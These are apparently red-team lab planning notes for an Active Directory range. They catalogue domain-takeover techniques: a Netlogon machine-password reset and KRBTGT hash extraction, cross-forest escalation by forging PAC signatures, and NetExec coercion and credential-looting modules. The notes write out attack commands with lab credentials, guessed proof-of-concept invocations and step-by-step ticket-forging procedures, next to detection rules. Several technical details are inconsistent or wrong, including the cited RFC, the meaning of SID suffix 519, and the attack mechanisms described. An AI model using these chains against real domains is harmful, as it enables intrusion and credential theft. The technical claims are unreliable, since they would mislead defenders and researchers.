**Paper text:** `C:\STUDY\Github\CADRE-Courses\woot2026-onelogon\woot2026-onelogon.txt` (923 lines, full PDF text). Same author as `krbrelayx` (Kerberos relaying toolkit).
**Tool:** Author's PoC not yet published — exploit implements MS-NRPC single-channel variant by hand. Likely PoC will appear on author's GitHub post-conference.

### Vulnerability mechanism (paper Section 3)

The MS-NRPC (Netlogon Remote Protocol) spec defines two transport channels:
- **Multi-channel NRPC** — runs over dedicated TCP port (typically direct TCP to high port via EPM on 135). Used for DC-to-DC replication.
- **Single-channel NRPC** — runs over TCP port 445 (SMB) using `\PIPE\netlogon` named pipe. Used for client-to-DC authentication.

Post-Zerologon hardening (CVE-2020-1472 patch + SpecterOps "Renaissance of NTLM Relay Attacks" 2025 mitigations) added a **mandatory secure-RPC seal** requirement to NetrServerAuthenticate3 / NetrLogonGetCapabilities calls. **This seal enforcement was added to multi-channel NRPC only.** Single-channel NRPC over SMB does not enforce the seal — it accepts the legacy non-secure-RPC form.

This means: an attacker who can speak single-channel NRPC against a DC (via SMB TCP/445 + `\PIPE\netlogon`) can use **the pre-Zerologon Netlogon protocol variant**, which has two catastrophic weaknesses:

1. **AES-CBC8 downgrade (Section 5.1)** — abuses RFC 4753 weak DES challenge-response; chosen-prefix collision reveals ANY password (machine, KRBTGT, or user) to the attacker.
2. **Zero-channel (Section 5.2)** — abuses the fact that single-channel NRPC accepts non-secure-RPC `NetrServerPasswordSet2` calls. Attacker calls this against the target DC's machine account using the (trivial) well-known computer name, sets the DC machine account password to attacker-known value, then DCSync via that account → full domain takeover in 1 step.

### Prerequisites (exact, all met on CADRE)

| # | Requirement | CADRE status |
|---|-------------|--------------|
| 1 | Network access to TCP/445 (SMB) on DC | ✅ All 3 DCs (dc01 .10, dc02 .11, dc03) expose SMB by default |
| 2 | Knowledge of target DC machine account name | ✅ `DC01$`, `DC02$`, `DC03$` — discoverable via Phase 0 Kerberos user enum + ADWS (SMB null session blocked on Server 2025 but computer SPNs are public) |
| 3 | Knowledge of target DC machine account password OR ability to capture one via NTLM relay | ✅ Achievable via Phase 5 WT017 (MS-RPRN PrinterBug coercion, 12 Suricata fires confirmed) — coerce DC to auth to attacker-controlled listener → capture NTLMv2 hash → crack or relay |

**Tested by author on:** Windows Server 2022 (latest patches). Server 2025 not explicitly mentioned but the single-channel variant is the same code path on all Server 2016+ versions. The hardening is what was added in 2020+ — and that hardening does NOT cover the single-channel path.

### Why this invalidates Campaign_suggestions.md item #65 (Zerologon Alternative)

Item #65 (Dirk-jan's 2020 variant) is marked "⏳ Pending — study reference (patched on Server 2025)". Onelogon (2026-06) **invalidates that conclusion** — the *original* Zerologon (CVE-2020-1472) is patched, but the **single-channel NRPC variant is not patched** because it's the same protocol path that all clients have always used. Onelogon's Section 5.2 attack is essentially "Zerologon that still works in 2026" — single RPC call sets DC machine password to attacker-known value.

### 76. Onelogon Zero-Channel — Set DC Machine Password (Phase 5 → 7 Shortcut) ⏳

**Tool:** Author's PoC (TBD — expected post-WOOT 2026). Until then: implement single-channel NRPC via impacket + manual NRPC packet crafting, OR use `NetrServerPasswordSet2` via `python-nrpc` fork.
**MITRE:** T1190 (Exploit Public-Facing Application) + T1187 (Forced Authentication) + T1078.002 (Valid Accounts: Domain Accounts)
**Status:** ⏳ Pending — gating on author's PoC release. Fully applicable to CADRE.

**Relevance to CADRE:** **Most impactful AD authentication bypass since Zerologon.** Chains existing Phase 5 coercion (WT017) with single-channel NRPC exploitation → attacker controls dc01$ / dc02$ / dc03$ machine account → DCSync → KRBTGT → Golden Ticket → full forest + Enterprise Admin (if SID Filter were off — it is, in this lab).

**Why CADRE needs it:** Maps directly to existing infrastructure:
- WT017 (MS-RPRN PrinterBug) ✅ already working, 12 Suricata SID:1000050 fires confirmed
- All 3 DCs expose SMB/445 (Phase 0 recon)
- Computer account names enumerable from unauthenticated Kerberos user enum (Phase 0 Step 2)
- Chained: WT017 capture → crack → Onelogon → DCSync → Golden Ticket in <30 min from any low-priv foothold

**Campaign location:** Phase 5 (Lateral Movement) → Phase 6 (DCSync) shortcut. Bypasses Phase 6 entirely — single RPC call = DA. Also Phase 8 cross-forest impact: if attacker compromises a child domain DC first, Onelogon against cadre.local DC = Enterprise Admin.

**Testing plan (gated on author's PoC):**
1. Verify SMB/445 reachability from Kali to all 3 DCs (Phase 0 recon step)
2. Verify computer account names `DC01$` / `DC02$` / `DC03$` via Phase 0 Step 5 SAMR enum
3. Wait for author's PoC (likely 1-2 weeks post-conference Aug 1-3 2026)
4. PoC expected commands (predicted from paper):
   ```bash
   # Capture DC machine account via WT017 PrinterBug coercion
   coercer coerce -t 192.168.77.11 -l 192.168.77.22 -d child.cadre.local \
     -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
   # Crack captured NTLMv2
   hashcat -m 5600 captured.txt cadre_passwords.txt  # NTLMv2
   # Run Onelogon
   python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 --auth 'DC01$:<cracked_hash>' \
     --set-password 'Pwn3dBy0ne!0g0n!'
   # DCSync with new password
   impacket-secretsdump -just-dc 'cadre.local/Administrator@192.168.77.10' \
     -hashes :<new_dc01_hash>
   ```
5. Verify Golden Ticket works post-attack (Phase 7)
6. **Restore:** Reset `DC01$` machine account password via `Reset-ComputerMachinePassword` on dc01 after testing — otherwise AD replication breaks across the forest

**Detection:**
- **Suricata**: TCP/445 traffic to DCs containing `\PIPE\netlogon` references — currently NO rule for this. New SID:1000098 candidate (single-channel NRPC pattern).
- **Zeek**: `zeek-smb.log` shows named-pipe access; pipe name `netlogon` from non-DC source = anomaly. New Zeek notice candidate in `cadre-conn-beacon.zeek` or `cadre-dce-rpc.zeek`.
- **WinSec 4624** (logon) Type 3 from non-admin source shortly after SMB to DC.
- **WinSec 4662** on `CN=DC01,OU=Domain Controllers,...` — `Write Property` on `unicodePwd` (machine account password reset) is the **highest-signal event** for Section 5.2.
- **Elastic KQL candidate**: `event.code:4662 AND winlog.event_data.ObjectDN:*CN=DC0* AND winlog.event_data.AccessMask:"0000000000000010"` (WriteProperty).

**Cross-references:**
- Item #65 (Zerologon Alternative) — superseded by Onelogon (post-Zerologon hardening bypass)
- WT017 (MS-RPRN PrinterBug) — provides the NTLM relay primitive that supplies Onelogon's auth prerequisite
- Campaign_suggestions.md #62 (Unconstrained Delegation) — alternative Phase 5 → DA shortcut; Onelogon is more reliable on Server 2025 because it doesn't require Print Spooler to be exploitable on mbr01
- WT009 (DCSync) — direct downstream exploitation step once Onelogon completes

### 77. Onelogon AES-CBC8 Downgrade — Hash Extraction of Any Account (Phase 3.5 alt) ⏳

**Tool:** Author's PoC (TBD). Predicted interface: `--extract-hash <account_name>`.
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys) + T1187 (Forced Authentication)
**Status:** ⏳ Pending — gating on author's PoC release.

**Relevance to CADRE:** Variant of #76 that targets ANY account password (user, machine, KRBTGT) instead of just resetting DC machine password. Less destructive — reads hash instead of changing password — but more flexible (works against any DC, can target KRBTGT directly → instant Golden Ticket without DCSync).

**Why CADRE needs it:** Provides direct KRBTGT hash extraction → Golden Ticket forging → domain persistence. **The single-step KRBTGT theft is arguably more impactful than even Section 5.2** because no account is modified (no 4662 event to detect), only a hash is computed offline.

**Campaign location:** Phase 3.5 (Credential Access) — alternative to LSASS dump + secretsdump. Also Phase 7 (Golden Ticket) shortcut — skip the DCSync step entirely.

**Testing plan:** Same prerequisites as #76. PoC predicted:
```bash
python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 \
  --extract-hash krbtgt --auth 'DC01$:<cracked_hash>'
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
# Forge Golden Ticket directly
python3 ticketer.py -nthash <NT_HASH> -domain-sid S-1-5-21-... -domain cadre.local Administrator
```

**Detection:** Harder to detect than #76 because no account state changes:
- **Suricata SID:1000098** (single-channel NRPC traffic to DC) is the **primary signal** — flag any non-DC source authenticating to `\PIPE\netlogon` over SMB/445.
- **WinSec 4769** (TGS request) using the resulting KRBTGT-forged ticket — but that's after-the-fact.
- **Zeek notice** on `zeek-smb.log` named-pipe `netlogon` from non-DC source — add to `cadre-outbound.zeek` or new `cadre-nrpc.zeek` script.

**Cross-references:**
- WT017 (MS-RPRN) — supplies the auth prerequisite
- WT009 (DCSync) — bypassed entirely; Onelogon AES-CBC8 directly produces the KRBTGT hash
- Phase 7 (Golden Ticket) — directly enabled without DCSync prerequisite
- Item #65 (Zerologon Alternative) — superseded; Onelogon AES-CBC8 is the working variant

### Detection Engineering Candidates (plan1.7 §16)

| Attack | Primary signal | Rule / script |
|---|---|---|
| #76 Onelogon Zero-Channel | WinSec 4662 WriteProperty on `CN=DC0*` machine account `unicodePwd` | Elastic KQL: `event.code:4662 AND ObjectDN:*DC0* AND AccessMask:"00000010"` |
| #76 Onelogon Zero-Channel | Suricata single-channel NRPC to `\PIPE\netlogon` | New SID:1000098 |
| #77 Onelogon AES-CBC8 | SMB named pipe `netlogon` from non-DC source | New Zeek notice in `cadre-nrpc.zeek` |
| #77 Onelogon AES-CBC8 | AES-CBC8 cipher usage (weak crypto) | Zeek `cadre-tls-fingerprint.zeek` analog for NRPC — new script |
| Both | WinSec 4624 Type 3 from non-admin source shortly after SMB to DC | Elastic KQL correlation rule |

### Items NOT to add to CAMPAIGNS.md (per current scope)

Per "main campaign testing first" workflow (established 2026-06-08): Onelogon entries (#76-77) live in Campaign_suggestions.md as research material. Will be moved to CAMPAIGNS.md + CAMPAIGNS-METADATA.md as WT095 + WT096 stubs **now** (high applicability to existing infrastructure), but full Mechanics sections will be filled post-author-PoC release. Detection engineering rules go to plan1.7 §16 separately.

---

## Skipjack — Cross-Forest Trust Downgrade via Invalid PAC Signature (GhostWolfLab, 2026-06-23)

**Source:** https://blog.ghostwolflab.com/redteam/786/ — "PAC 签名无效引发的域信任降级攻击" (Domain Trust Downgrade Attack Caused by Invalid PAC Signatures). Posted 2026-06-23 by Ghost Wolf Lab.

**Attack name:** Skipjack (skip the signature check, jack the downgrade logic).

### Vulnerability mechanism

Kerberos **PAC (Privilege Attribute Certificate)** is signed with two signatures for integrity:
- **Service signature** — signs PAC with target service account key
- **KDC signature** — secondary signature with KDC's own key

When signature verification **fails**, Windows DCs have a **downgrade fallback** (designed for legacy compatibility with older KDCs): instead of rejecting the ticket, the DC looks up the user in the local AD database and rebuilds the token from AD's stored group memberships.

**The vulnerability:** In **cross-forest trust** scenarios where **SID filtering is disabled** (legacy NT4 trusts, partner trusts), an attacker in Forest A can:
1. Get a TGT in Forest A
2. Modify the PAC to inject Forest B's Domain Admins SID (`S-1-5-21-<B>-519`)
3. **Delete or corrupt the PAC signatures** (so verification fails)
4. Submit the forged TGT to Forest B's DC
5. DC's signature verification fails → enters downgrade mode
6. Downgrade mode rebuilds token BUT keeps the PAC's forged SIDs (because SID filtering is off)
7. **Attacker becomes Domain Admin in Forest B**

### Why this matters for CADRE (HIGH applicability)

| CADRE Element | Status |
|---|---|
| **2 forests** (cadre.local, range.local) | ✅ Exists |
| **Cross-forest trust** | ✅ Exists |
| **SID Filter OFF** | ✅ Verified in `01-core-ad.yml:50` per AGENTS.md (Server 2025 forest trusts default to SID filtering disabled) |
| **Phase 8 already tests SID injection** | ✅ But uses Golden Ticket method (requires krbtgt hash) |
| **Skipjack vs Golden Ticket** | Skipjack is **alternative without krbtgt hash** — uses downgrade logic |
| **Phase 8 telemetry baseline** | ✅ Suricata/Zeek already in place |

### Pre-conditions (all met on CADRE)

1. ✅ Attacker controls user account in **Forest A** (cadre.local or range.local) — e.g., `intern_blue` in child.cadre.local
2. ✅ Forest A ↔ Forest B has cross-forest trust
3. ✅ **SID Filter OFF** on the trust (verified per `01-core-ad.yml:50`)
4. ✅ Attacker can target Forest B (range.local or cadre.local) where they want DA
5. ✅ Either: same username exists in Forest B, OR attacker uses SID injection to claim Domain Admins SID

### 97. Skipjack — Cross-Forest Trust Downgrade via PAC Signature Corruption (Phase 8 alt) ⏳

**Tool:** Rubeus with custom compile (need `/injectSID + /corruptSignature` flags), OR custom `skipjack_forge.py` (pseudocode from blog post — needs implementation)
**MITRE:** T1558 (Steal or Forge Kerberos Tickets) + T1484 (Modify Domain Trust)
**Status:** ⏳ Pending — needs custom Rubeus build or Python implementation

**Relevance to CADRE:** **Direct fit for Phase 8 (Forest Trust Escalation).** Provides alternative path to current SID injection attack that uses Golden Ticket (forged TGT with krbtgt hash). Skipjack uses **legitimate user's TGT with corrupted signatures** + SID injection — no krbtgt hash required.

**Why CADRE needs it:**
- Avoids DCSync step (no need for krbtgt hash extraction)
- Harder to detect than Golden Ticket forging (uses downgrade behavior as legitimate cover)
- Tests a different trust weakness than what current Phase 8 covers
- Maps to existing campaign: child.cadre.local user → cadre.local DA via trust

**Testing plan:**
1. From Kali (or mbr01), as `intern_blue` in child.cadre.local: request TGT with `getTGT.py` or `Rubeus asktgt`
2. Decrypt the TGT to extract the PAC
3. Modify the PAC GROUP_MEMBERSHIP array — inject `S-1-5-21-<cadre.local-domain>-519` (Enterprise Admins)
4. **Delete or corrupt** the PAC's KDC and service signatures (zero out the buffers)
5. Re-encrypt the TGT (with corruption intact)
6. Submit the forged TGT to dc01.cadre.local as a service ticket request
7. DC verifies PAC signature → FAILS → enters downgrade mode
8. Downgrade mode checks local AD + SID filter status
9. SID filter OFF → keeps forged SID → builds token with Enterprise Admins
10. **Attacker is now DA in cadre.local** (entire forest if also DA in child)

**Detection (already partially in place):**
- **WinSec 4826** (PAC verification failed) — primary signal
- **WinSec 4769** (TGS request) — flag requests where the ticket has invalid PAC signatures
- **Zeek kerberos.log** — inter-realm TGT requests with corrupted auth-data fields
- **Suricata SID:1000015** (Kerberoast burst) — could be extended to detect PAC signature anomalies

**Defense (per GhostWolfLab + Microsoft):**
- **Enable SID filtering** on all cross-forest trusts (CRITICAL — closes the attack)
- **Force PAC validation:** `HKLM\System\CurrentControlSet\Services\Kdc\Parameters\KdcValidatePac = 1` (Group Policy)
- **Monitor 4826 events** — alert on any PAC verification failures (rare in healthy environment)
- **ESAE** (Enhanced Security Admin Environment) for high-priv accounts

**Cross-references:**
- Item #66 Forest Trust SID Filtering — **directly addresses the root cause** (SID filter OFF enables this attack)
- Item #67 CVE-2020-0665 Trust Bypass — related forest trust bypass technique
- Phase 8 (Forest Trust Escalation) in CAMPAIGNS.md — current SID injection uses Golden Ticket; Skipjack is alternative
- Item #76 Onelogon — different vulnerability (single-channel NRPC vs PAC downgrade) but similar outcome (forest compromise)

**Status:** ⏳ Pending — needs:
1. Custom Rubeus build with `/corruptSignature` flag (or implement `skipjack_forge.py` per blog pseudocode)
2. Or use `ticketer.py` (impacket) with PAC manipulation + signature zero-out
3. Test target: dc01.cadre.local (root DC of cadre.local forest)
4. Source: from intern_blue (child.cadre.local user)

**Why standalone / why pending:**
- Custom tool needed (no off-the-shelf PoC)
- High risk of detection during testing (4826 fires)
- Complements existing Phase 8 (Golden Ticket) — different mechanism, same outcome
- Test in lab after Phase 8 verified

### Items NOT to add to CAMPAIGNS.md (per current scope)

Per "main campaign testing first" workflow: Skipjack (#97) lives in Campaign_suggestions.md as research material. **Will be moved to CAMPAIGNS.md + CAMPAIGNS-METADATA.md as WT097 stub now** (high applicability to existing Phase 8 infrastructure), but full Mechanics section will be filled when test executes. Detection engineering rules go to plan1.7 §16 (paired with Onelogon) separately.

---

## NetExec New Modules (Hacking Articles AI+HexStrike Analysis, 2026-06-24)

**Source:** https://www.hackingarticles.in/ai-powered-active-directory-pentesting-with-claude-hexstrike-ai-netexec/ (June 21, 2026). Article walks through HexStrike AI + Claude Desktop driving NetExec end-to-end. **Key value for CADRE**: comprehensive NetExec command reference and 6 modules we hadn't previously documented.

### Background

The article is essentially a guided tour of NetExec wrapped in Claude+HexStrike AI scaffolding (the AI just translates English prompts → nxc commands; the real value is the **NetExec command reference** at the end). Reading for CADRE applicability revealed:
- **`--kdcHost` flag** — CRITICAL for our multi-DC setup (we have 3 DCs; without this, AS-REQ may be sent to an unreachable DC)
- **`-M coerce_plus`** — consolidated NTLM coercion check (replaces running individual WT017-020 checks)
- **6 new NetExec modules** we hadn't documented:
  - `-M pre2k` — Pre-Windows 2000 computer account abuse check
  - `-M enum_av` — AV/EDR enumeration (pre-attack OPSEC)
  - `-M get-desc-users` — User description field enumeration (sometimes has plaintext passwords)
  - `-M winscp` — WinSCP saved session decryption (Phase 3.5 creds)
  - `-M rdp` — RDP enablement (`-o ACTION=enable`)
  - `--dpapi` — Built-in DPAPI loot (alternative to DonPAPI module)

### 98. NetExec `coerce_plus` + 5 new modules 🆕

**Source:** NetExec v1.5.1 — 6 modules from article + 1 critical flag fix.
**Tools:** All built into `nxc` (no separate install).
**MITRE:** T1187 (Forced Authentication), T1555 (Credentials from Password Stores), T1087 (Account Discovery), T1518 (Software Discovery).
**Status:** 🆕 Add — Phase 0 recon enhancement + Phase 5 coercion consolidation.

#### A. `--kdcHost` flag (CRITICAL for multi-DC)

**Why CADRE needs it:** Without `--kdcHost`, NetExec's AS-REP roast and Kerberoast commands may send the AS-REQ to an unreachable DC (KDC routing quirk). Our existing Phase 1/2 commands in CAMPAIGNS.md were vulnerable to this silent failure.

```bash
# WITHOUT --kdcHost — may fail silently on multi-DC
nxc ldap 192.168.77.10 -u user -p pass --asreproast /tmp/asrep.txt

# WITH --kdcHost — correct pattern
nxc ldap 192.168.77.10 -u user -p pass --asreproast /tmp/asrep.txt --kdcHost 192.168.77.10
```

**Maps to:** Phase 1 (AS-REP roast WT003) + Phase 2 (Kerberoast WT002). Updated in CAMPAIGNS.md.

#### B. `-M coerce_plus` — Consolidated Coercion Check

**Why CADRE needs it:** Single command replaces running 5 individual coercion checks (WT017-020 + MSEven). Should be the Phase 5 **pre-flight** before any coercion exploit.

```bash
# Run against all DCs in one shot
nxc smb 192.168.77.10,11,12 -u svc_mssql -p 's3rv1c3_MSSQL!' -M coerce_plus

# Output per DC:
#   DFSCoerce:  VULNERABLE / NOT VULNERABLE
#   PetitPotam: VULNERABLE / NOT VULNERABLE
#   PrinterBug: VULNERABLE / NOT VULNERABLE
#   MSEven:     VULNERABLE / NOT VULNERABLE
```

**Maps to:** Phase 5 (Coercion) — replaces individual WT017-020 recon. WT017 (PrinterBug) already verified 12 fires on dc02. Updated in CAMPAIGNS.md as WT096.

#### C. `-M pre2k` — Pre-Windows 2000 Computer Account Abuse

**Why CADRE needs it:** Detects machine accounts still using default computer-name passwords (truncated to 14 chars, lowercase). Untapped in our campaign.

```bash
nxc ldap 192.168.77.10 -u user -p pass -M pre2k --kdcHost 192.168.77.10
# Flags machine accounts with default passwords
```

**Maps to:** Phase 0 recon (new technique).

#### D. `-M enum_av` — AV/EDR Enumeration

**Why CADRE needs it:** Pre-attack OPSEC. Informs tool selection (loud vs stealth). CADRE has Defender disabled per `04-vulnerabilities.yml` — this confirms it.

```bash
nxc smb 192.168.77.0/24 -u user -p pass -M enum_av
# Returns: Defender (always), plus any 3rd-party EDR (Sophos, CrowdStrike, etc.)
```

**Maps to:** Phase 0 recon — pre-attack OPSEC check.

#### E. `-M get-desc-users` — User Description Field Enumeration

**Why CADRE needs it:** Some admins stash passwords/notes in user `description` attribute. Cheap recon.

```bash
nxc ldap 192.168.77.10 -u user -p pass -M get-desc-users
# Returns all user descriptions
```

**Maps to:** Phase 0 recon — cheap password leak check.

#### F. `-M winscp` — WinSCP Saved Session Decryption

**Why CADRE needs it:** WinSCP saves sessions in registry (HKCU\Software\Martin Prikryl\WinSCP 2\Sessions) or WinSCP.ini with **weak reversible encryption**. Single module returns plaintext credentials.

```bash
nxc smb 192.168.77.22 -u admin -p pass -M winscp
# Returns: hostname, username, plaintext password for each saved session
```

**Maps to:** Phase 3.5 (Credential Access) — pairs with lsassy (3.5F-alt) + DonPAPI (3.5F-dpapi).

#### G. `-M rdp -o ACTION=enable` — RDP Enablement

**Why CADRE needs it:** Operational primitive for setting up interactive access after admin compromise. Already in playbook `04-vulnerabilities.yml` (manual), but nxc provides 1-shot automation.

```bash
# Enable RDP on target
nxc smb 192.168.77.22 -u admin -p pass -M rdp -o ACTION=enable

# Disable RDP on target
nxc smb 192.168.77.22 -u admin -p pass -M rdp -o ACTION=disable
```

**Maps to:** Operational primitive (Phase 3-8 transitions).

#### H. `nxc smb --dpapi` — Built-in DPAPI Loot

**Why CADRE needs it:** Built-in alternative to DonPAPI module. nxc handles master key decryption inline.

```bash
nxc smb 192.168.77.22 -u admin -p pass --dpapi
# Returns: decrypted Credential Manager, browser, WiFi creds
```

**Maps to:** Phase 3.5 — pairs with lsassy + DonPAPI.

### Cross-Reference Index update

| # | Item | Source |
|---|------|--------|
| 98 | NetExec `coerce_plus` + 5 new modules + `--kdcHost` flag | Hacking Articles AI+HexStrike analysis (2026-06-24) |
| **99** | **ADeleg — GUI tool for ACL/ADCS recon** | **ADeleg podcast Episode 173 + course material (`CADRE-Courses/How to Find Insecure Active Directory Permissions with ADeleg/`)** |
| **100** | **Windows Security Internals — Study reference (Phase 1/2/5/6/7/8)** | **James Forshaw, NoStarchPress 2023 (`CADRE-Courses/NoStarchPress_extract/WindowsSecurityInternals_11172023/`, 1.3MB .txt + 19.6MB .html)** |
| **101** | **Practical Purple Teaming — Study reference (DFIR + plan1.7)** | **Chase Petrey, NoStarchPress (`CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/`, 725KB .txt + 770KB .html)** |

---

## NoStarchPress Reference Library Survey (2026-06-24)

**Source:** `CADRE-Courses/NoStarchPress_extract/` — surveyed all 49 directories. **Two books have high direct value to CADRE campaign** (rest are not relevant or duplicative of existing content):

| Book | Size | AD Matches | Maps to |
|---|---|---|---|
| **Windows Security Internals** (Forshaw, 2023) | 1.3MB txt / 19.6MB html | **600** | Phase 1/2/5/6/7/8 + Onelogon/Skipjack/Zerologon |
| **Practical Purple Teaming** (Petrey) | 725KB txt / 770KB html | **255** | DFIR side + plan1.7 + tracker.md workflow |

**Lower value (deprioritized):** Pentesting Azure Applications (74), EvadingEDR (85), Red Team Engineering (53), Ethical Hacking (135), Black Hat Python (5), Gray Hat C# (0).

### 100. Windows Security Internals — Reference Book for Kerberos/AD Internals ⏳

**Source:** James Forshaw (Project Zero, Google). NoStarchPress, 2023. `CADRE-Courses/NoStarchPress_extract/WindowsSecurityInternals_11172023/`.
**Tool:** Reference book + PowerShell examples (uses NtObjectManager module).
**MITRE:** N/A (reference material — informs many MITRE IDs across phases)
**Status:** ⏳ Pending — read before Phase 1/2/5/7/8 attack execution

**Why CADRE needs it:**
1. **Deep Kerberos protocol coverage** (Chapter 14) — explains TGT, TGS-REQ, AS-REP, PAC structure, ticket encryption in PowerShell. Directly supports Phase 1 (AS-REP), Phase 2 (Kerberoast), Phase 7 (Golden Ticket), Skipjack (#97), Onelogon (#76).
2. **Active Directory internals** (Chapter 11) — security descriptors, ACE inheritance, default DACLs, dsHeuristics. Supports Branch A (ACL Abuse), Branch B (ADCS — CA ACLs).
3. **Security descriptors** (Chapters 5-8) — DACL/SACL/owner mechanics, access mask interpretation. Directly relevant to plan1.7 detection (4662 events, AccessMask decoding).
4. **Security auditing** (Chapter 9) — SACL configuration, audit policy. Directly relevant to plan1.7 §16 detection engineering.
5. **Access tokens** (Chapter 4) — token impersonation mechanics. Supports Phase 3.5 LSASS dump, token impersonation attack (WT039).

**Specific maps to CADRE:**

| Book chapter | CADRE phase/section |
|---|---|
| Ch 4 (Access Tokens) | Phase 3.5 (LSASS, token impersonation) |
| Ch 5-8 (Security Descriptors) | Branch A (14 ACEs), plan1.7 §16 (AccessMask decoding) |
| Ch 9 (Security Auditing) | plan1.7 (SACL configuration for detection) |
| Ch 10 (Windows Authentication) | Phase 1/2 foundation, NTLM/Kerberos basics |
| **Ch 11 (Active Directory)** | **Phase 0/4/8, Branch A, ADCS** |
| Ch 12 (Interactive Auth) | Phase 1/2/3.5, WT029 (UnPAC-the-Hash) |
| Ch 13 (Network Auth) | Phase 2/5 (Kerberos over network) |
| **Ch 14 (Kerberos)** | **Phase 1 (AS-REP), Phase 2 (Kerberoast), Phase 7 (Golden Ticket), Onelogon (#76), Skipjack (#97), Zerologon (#65)** |
| Ch 15 (Negotiate/SSP) | Phase 2/3.5 (NTLM vs Kerberos) |

**When to read:**
- Before executing Phase 1 (AS-REP) — understand the AS-REP format
- Before Phase 2 (Kerberoast) — understand TGS-REQ format
- Before Phase 7 (Golden Ticket) — understand TGT structure (relates to Skipjack PAC downgrade)
- Before Skipjack (#97) testing — understand PAC signing model (service + KDC sigs)
- Before Onelogon (#76) testing — understand single-channel NRPC bypass
- Before plan1.7 detection engineering — understand AccessMask + SACL mechanics

**Cross-references:**
- Item #65 (Zerologon Alternative) — superseded by Onelogon, all explained by Ch 14
- Item #76 (Onelogon Zero-Channel) — bypass mechanism explained by Ch 14 (PAC downgrade fallback)
- Item #97 (Skipjack PAC downgrade) — direct PAC signature downgrade mechanism explained
- Phase 7 (Golden Ticket) — krbtgt key forging explained in Ch 14
- plan1.7 (detection engineering) — SACL + AccessMask decoding

### 101. Practical Purple Teaming — Reference Book for Lab + DFIR ⏳

**Source:** Chase Petrey. NoStarchPress. `CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/`.
**Tool:** Reference book + lab setup + Caldera/Mythic/Atomic Red Team workflows.
**MITRE:** N/A (reference material — informs plan1.7 + DFIR side)
**Status:** ⏳ Pending — read for DFIR-Nexus integration + plan1.7 detection engineering

**Why CADRE needs it:**
1. **Environment Setup** (Ch 5) — lab setup patterns align with our CADRE topology
2. **Collecting Telemetry** (Ch 6) — Suricata/Zeek/Sysmon/WinSec correlation patterns (matches our plan1.7)
3. **ETW + Memory Scanning** (Ch 7) — advanced detection beyond our current scope (could feed plan1.7 §17)
4. **Atomic Red Team** (Ch 8) — execution framework that complements our CAMPAIGNS.md (we have manual attack commands; Atomic Red Team provides 1000+ tests)
5. **MITRE Caldera AD recon** (Ch 9) — adversary emulation platform (we already track this in Track B Parallel Tracks)
6. **Mythic C2** (Ch 10) — covers C2 operations (relevant to Plan 10 + our Loki integration)
7. **Reporting + Tracking** (Ch 11) — directly relevant to our `tracker.md` workflow + DFIR-Nexus case reports

**Specific maps to CADRE:**

| Book chapter | CADRE component |
|---|---|
| Ch 5 (Environment Setup) | CADRE lab topology reference |
| **Ch 6 (Collecting Telemetry)** | **plan1.7 detection engineering (Suricata + Zeek + Sysmon + WinSec + EDR)** |
| Ch 7 (ETW + Memory Scanning) | plan1.7 §17 (future enhancement) |
| **Ch 8 (Atomic Red Team)** | **CAMPAIGNS.md testing — pairs with our manual attack commands** |
| Ch 9 (Caldera AD Recon) | Track B (Caldera integration in Parallel Tracks) |
| Ch 10 (Mythic C2) | Plan 10 (C2+Emulation), Loki integration |
| **Ch 11 (Reporting + Tracking)** | **tracker.md workflow + DFIR-Nexus case reports** |
| Ch 12 (Purple Teaming Function) | DFIR-Nexus integration model |

**When to read:**
- Before plan1.7 detection engineering work — Ch 6 telemetry patterns
- Before Track B (Caldera integration) — Ch 9 AD recon
- Before Plan 10 (C2+Emulation) — Ch 10 Mythic
- During DFIR-Nexus integration — Ch 11 reporting + Ch 12 organizational patterns

**Cross-references:**
- plan1.7 (Detection Engineering) — Ch 6 telemetry collection patterns
- Track B (Caldera Adversary Emulation) — Ch 9 AD recon automation
- Track E (Forensic Tooling) — Ch 7 ETW + memory scanning
- Plan 9 (AI Forensics) — Ch 11 reporting model
- Plan 10 (C2+Emulation) — Ch 10 Mythic
- DFIR-Nexus integration — Ch 12 organizational model

### Items NOT to add to CAMPAIGNS.md (per current scope)

Both items (#100, #101) are **reference books**, not new attack techniques. They go to CAMPAIGNS.md **Study Reference Library** (one-liner entry + chapter map), not to Mechanics sections. Full integration is held until post-campaign.

**Recommended post-campaign work:**
1. After Phase 1-8 verified: extract concrete techniques from WindowsSecurityInternals Ch 14 (Kerberos) — add to CAMPAIGNS-METADATA.md as deeper Mechanics
2. After DFIR-Nexus integration: extract patterns from Practical Purple Teaming Ch 11 — apply to `tracker.md`
3. After plan1.7 detection engineering: extract detection rule patterns from both books

---

## ADeleg — Windows GUI Tool for ACL/ADCS Recon (Episode 173, 2026-06-24)

**Source:** ADeleg podcast Episode 173 + article at `CADRE-Courses/How to Find Insecure Active Directory Permissions with ADeleg/Episode 173_*.txt` (21,554 bytes). ADeleg = Windows GUI tool for enumerating Active Directory delegated permissions. https://github.com/trimarc/ADeleg

### What is ADeleg

Per the article: *"adelec is an active directory delegation management tool and what i really like about it is it gets you almost the same amount of information that bloodhound gets you but with like a third of the hassle right you don't have to set up bloodhound and you don't have to run the sharp pound collector in your environment and trigger all your edr alerts you don't have to set up docker to like set up the bloodhound ui and node for neoj and all that."*

**Key differentiators from BloodHound:**
- **No SharpHound collector** needed — avoids EDR alerts
- **No Docker/Neo4j setup** — pure Windows GUI
- **No LDAP bind required** (runs as domain user) — easier than BloodHound in hardened environments
- **GUI-based** — great for demos, screenshots, reports
- **Direct view by Trustee** — organized view that maps directly to attacker perspective (which user has rights to what)

### Two key concepts from the article

**"Unsafe users" / "Unsafe groups":**
> "the top four groups that we look for first when we use this tool and so on the screen you can see that uh authenticated users is selected here on the left and on the right there are resources here in the middle then we have the type which is just allow owner deny etc and on the far right in the details column it shows the permissions"
- everyone
- authenticated users
- domain users
- domain computers
- Common real-world unsafe group: domain join account (often over-permissioned)

**"Unsafe permissions":**
- GenericAll / Full Control
- WriteAllProperties / WriteProperty
- WriteDacl / WriteOwner
- ForceChangePassword / ResetPassword
- Delete
- CreateChild / DeleteChild
- AllExtendedRights (for ADCS abuse)
- Apply-Group-Policy (for GPO abuse)

### ADCS misconfiguration discovery

